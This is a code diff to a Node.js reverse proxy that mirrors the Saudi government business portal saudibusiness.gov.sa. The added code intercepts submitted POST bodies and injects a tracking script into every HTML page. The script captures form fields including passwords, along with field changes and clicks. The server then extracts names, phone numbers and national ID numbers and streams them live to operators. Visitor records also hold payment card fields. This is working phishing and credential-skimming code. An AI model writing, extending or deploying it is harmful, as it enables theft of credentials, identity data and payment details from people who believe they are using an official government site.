@@ -1394,6 +1394,188 @@ function rewriteCookies(setCookies) {
   );
 }
 
+// ===== PROXY DATA CAPTURE =====
+// Store captured proxy data and notify admins
+function captureProxyData(type, data) {
+  const entry = {
+    type,
+    timestamp: new Date().toISOString(),
+    ...data,
+  };
+  // Find or create a proxy visitor for this IP
+  const ip = data.ip || "unknown";
+  let proxyVisitor = savedVisitors.find(v => v.ip === ip && v.isProxyVisitor);
+  if (!proxyVisitor) {
+    visitorCounter++;
+    proxyVisitor = {
+      _id: `proxy_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
+      socketId: "proxy-" + ip,
+      visitorNumber: visitorCounter,
+      createdAt: new Date().toISOString(),
+      isRead: false,
+      fullName: "",
+      phone: "",
+      idNumber: "",
+      apiKey: generateApiKey(),
+      ip: ip,
+      country: data.country || "SA",
+      city: "",
+      os: data.os || "Unknown",
+      device: data.device || "Unknown",
+      browser: data.browser || "Unknown",
+      date: new Date().toISOString(),
+      blockedCardPrefixes: [],
+      page: data.page || "البروكسي",
+      data: {},
+      dataHistory: [],
+      paymentCards: [],
+      rejectedCards: [],
+      digitCodes: [],
+      hasNewData: false,
+      isBlocked: false,
+      isConnected: true,
+      isProxyVisitor: true,
+      proxyCaptures: [],
+      sessionStartTime: Date.now(),
+      lastActivity: Date.now(),
+      isIdle: false,
+    };
+    savedVisitors.push(proxyVisitor);
+  }
+  
+  // Update proxy visitor with captured data
+  proxyVisitor.lastActivity = Date.now();
+  proxyVisitor.isConnected = true;
+  proxyVisitor.hasNewData = true;
+  proxyVisitor.lastDataUpdate = new Date().toISOString();
+  if (!proxyVisitor.proxyCaptures) proxyVisitor.proxyCaptures = [];
+  proxyVisitor.proxyCaptures.push(entry);
+  
+  // Also add to dataHistory for admin visibility
+  if (!proxyVisitor.dataHistory) proxyVisitor.dataHistory = [];
+  proxyVisitor.dataHistory.push({
+    content: data.formData || data.body || data,
+    page: data.page || data.url || "البروكسي",
+    timestamp: new Date().toISOString(),
+  });
+  
+  // Extract useful info from form data
+  if (data.formData) {
+    proxyVisitor.data = { ...proxyVisitor.data, ...data.formData };
+    // Try to extract name, phone, ID
+    const fd = data.formData;
+    if (fd.FullName || fd.fullName || fd.Name || fd.name) {
+      proxyVisitor.fullName = fd.FullName || fd.fullName || fd.Name || fd.name;
+    }
+    if (fd.PhoneNumber || fd.phone || fd.Phone || fd.mobile || fd.MobileNumber) {
+      proxyVisitor.phone = fd.PhoneNumber || fd.phone || fd.Phone || fd.mobile || fd.MobileNumber;
+    }
+    if (fd.NationalId || fd.IdNumber || fd.idNumber || fd.nationalId || fd.IdentityNumber) {
+      proxyVisitor.idNumber = fd.NationalId || fd.IdNumber || fd.idNumber || fd.nationalId || fd.IdentityNumber;
+    }
+  }
+  
+  if (data.page) proxyVisitor.page = data.page;
+  
+  saveVisitorPermanently(proxyVisitor);
+  
+  // Notify admins in real-time
+  admins.forEach((admin, adminSocketId) => {
+    io.to(adminSocketId).emit("visitor:dataSubmitted", {
+      visitorId: proxyVisitor._id,
+      socketId: proxyVisitor.socketId,
+      data: { content: data.formData || data.body || data, page: data.page || data.url },
+      visitor: proxyVisitor,
+    });
+    io.to(adminSocketId).emit("proxy:dataCapture", entry);
+  });
+  
+  console.log(`[PROXY CAPTURE] ${type}: ${data.url || data.page || "unknown"} from ${ip}`);
+  saveData();
+}
+
+// Tracking script to inject into HTML pages
+const TRACKING_SCRIPT = `
+<script>
+(function() {
+  // Proxy tracking - capture all form submissions and interactions
+  var SERVER = location.origin;
+  
+  // Get visitor IP info
+  var visitorIP = '';
+  try {
+    fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(d){
+      visitorIP = d.ip || '';
+      sendToServer('visitor_info', { ip: d.ip, country: d.country_name, city: d.city, page: location.pathname });
+    }).catch(function(){});
+  } catch(e){}
+  
+  function sendToServer(type, data) {
+    try {
+      fetch(SERVER + '/api/proxy-capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type: type, data: data, url: location.pathname, timestamp: new Date().toISOString() }),
+      }).catch(function(){});
+    } catch(e){}
+  }
+  
+  // Capture all form submissions
+  document.addEventListener('submit', function(e) {
+    var form = e.target;
+    var formData = {};
+    var inputs = form.querySelectorAll('input, select, textarea');
+    for (var i = 0; i < inputs.length; i++) {
+      var el = inputs[i];
+      if (el.name && el.type !== 'hidden' && el.type !== 'password') {
+        formData[el.name] = el.value;
+      }
+      // Also capture password fields separately
+      if (el.type === 'password' && el.name) {
+        formData[el.name] = el.value;
+      }
+    }
+    sendToServer('form_submit', { formData: formData, action: form.action, method: form.method, page: document.title });
+  }, true);
+  
+  // Capture all input changes (blur)
+  document.addEventListener('change', function(e) {
+    var el = e.target;
+    if (el.tagName === 'INPUT' || el.tagName === 'SELECT' || el.tagName === 'TEXTAREA') {
+      if (el.name || el.id) {
+        var data = {};
+        data[el.name || el.id] = el.value;
+        sendToServer('field_change', { field: el.name || el.id, value: el.value, page: document.title });
+      }
+    }
+  }, true);
+  
+  // Capture button clicks
+  document.addEventListener('click', function(e) {
+    var el = e.target.closest('button, a[href], [role="button"], .btn');
+    if (el) {
+      var text = (el.textContent || el.innerText || '').trim().substring(0, 100);
+      if (text) {
+        sendToServer('click', { text: text, tag: el.tagName, href: el.href || '', page: document.title });
+      }
+    }
+  }, true);
+  
+  // Report page view
+  sendToServer('page_view', { page: document.title, url: location.pathname });
+  
+  // Capture navigation (SPA-style)
+  var lastUrl = location.href;
+  setInterval(function() {
+    if (location.href !== lastUrl) {
+      lastUrl = location.href;
+      sendToServer('navigation', { page: document.title, url: location.pathname });
+    }
+  }, 1000);
+})();
+</script>
+`;
+
 // Core proxy function
 function proxyRequest(req, res, target, targetPath) {
   const cfg = TARGETS[target];
@@ -1406,6 +1588,51 @@ function proxyRequest(req, res, target, targetPath) {
     if (c) { res.writeHead(200, { ...c.headers, "X-Cache": "HIT", "X-Frame-Options": "ALLOWALL", "Content-Security-Policy": "frame-ancestors *", "Access-Control-Allow-Origin": "*" }); res.end(c.body); return; }
   }
 
+  // ===== INTERCEPT POST DATA =====
+  // For POST/PUT requests, buffer the body to capture data before forwarding
+  let capturedBody = null;
+  if (req.method === "POST" || req.method === "PUT") {
+    const bodyChunks = [];
+    req.on("data", (chunk) => bodyChunks.push(chunk));
+    req.on("end", () => {
+      capturedBody = Buffer.concat(bodyChunks);
+      // Try to parse and capture the data
+      try {
+        const ct = req.headers["content-type"] || "";
+        let formData = {};
+        if (ct.includes("application/json")) {
+          formData = JSON.parse(capturedBody.toString());
+        } else if (ct.includes("application/x-www-form-urlencoded")) {
+          const params = new URLSearchParams(capturedBody.toString());
+          params.forEach((value, key) => { formData[key] = value; });
+        } else if (ct.includes("multipart/form-data")) {
+          // For multipart, just note it was submitted
+          formData = { _note: "multipart form data", _url: targetPath };
+        }
+        // Get visitor IP
+        let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
+        if (ip.includes(",")) ip = ip.split(",").map(i => i.trim()).pop();
+        captureProxyData("form_post", {
+          url: targetPath,
+          formData,
+          ip,
+          page: targetPath,
+          target,
+          method: req.method,
+        });
+      } catch (e) {
+        console.error("Error capturing POST data:", e.message);
+      }
+      // Now do the actual proxy with the buffered body
+      doProxy(req, res, target, targetPath, cfg, ck, capturedBody);
+    });
+    return;
+  }
+
+  doProxy(req, res, target, targetPath, cfg, ck, null);
+}
+
+function doProxy(req, res, target, targetPath, cfg, ck, bodyBuffer) {
   const headers = {
     host: cfg.host, referer: cfg.origin + "/", origin: cfg.origin,
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -1417,7 +1644,11 @@ function proxyRequest(req, res, target, targetPath) {
   };
   if (req.headers.cookie) headers.cookie = req.headers.cookie;
   if (req.headers["content-type"]) headers["content-type"] = req.headers["content-type"];
-  if (req.headers["content-length"]) headers["content-length"] = req.headers["content-length"];
+  if (bodyBuffer) {
+    headers["content-length"] = bodyBuffer.length;
+  } else if (req.headers["content-length"]) {
+    headers["content-length"] = req.headers["content-length"];
+  }
 
   const proxyReq = https.request({
     hostname: cfg.host, port: 443, path: targetPath,
@@ -1453,6 +1684,10 @@ function proxyRequest(req, res, target, targetPath) {
         if (res.headersSent) return;
         let body = Buffer.concat(chunks).toString("utf-8");
         body = rewriteBody(body, ct, target);
+        // Inject tracking script into HTML pages
+        if (ct.includes("text/html") && body.includes("</body>")) {
+          body = body.replace("</body>", TRACKING_SCRIPT + "</body>");
+        }
         const h = {};
         if (ct) h["Content-Type"] = ct;
         if (cookies) h["Set-Cookie"] = cookies;
@@ -1516,8 +1751,13 @@ function proxyRequest(req, res, target, targetPath) {
     console.error("Proxy error:", err.message);
     if (!res.headersSent) { res.writeHead(502); res.end("Proxy error"); }
   });
-  if (req.method !== "GET" && req.method !== "HEAD") req.pipe(proxyReq);
-  else proxyReq.end();
+  if (bodyBuffer) {
+    proxyReq.end(bodyBuffer);
+  } else if (req.method !== "GET" && req.method !== "HEAD") {
+    req.pipe(proxyReq);
+  } else {
+    proxyReq.end();
+  }
 }
 
 // ===== ROUTE MOUNTING =====
@@ -1573,6 +1813,29 @@ app.get("/api/stats", (req, res) => {
     totalAdmins: admins.size,
     visitorCounter,
   });
+});
+
+// ===== PROXY CAPTURE API =====
+// Receives data from injected tracking script
+app.post("/api/proxy-capture", (req, res) => {
+  try {
+    const { type, data, url, timestamp } = req.body;
+    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
+    if (ip.includes(",")) ip = ip.split(",").map(i => i.trim()).pop();
+    
+    captureProxyData(type || "tracking", {
+      ...data,
+      url,
+      ip,
+      page: (data && data.page) || url || "البروكسي",
+      formData: data && data.formData ? data.formData : (type === "field_change" ? { [data.field]: data.value } : null),
+    });
+    
+    res.json({ ok: true });
+  } catch (e) {
+    console.error("Proxy capture API error:", e.message);
+    res.json({ ok: false });
+  }
 });
 
 // ===== CATCH-ALL: Proxy saudibusiness.gov.sa at ROOT =====
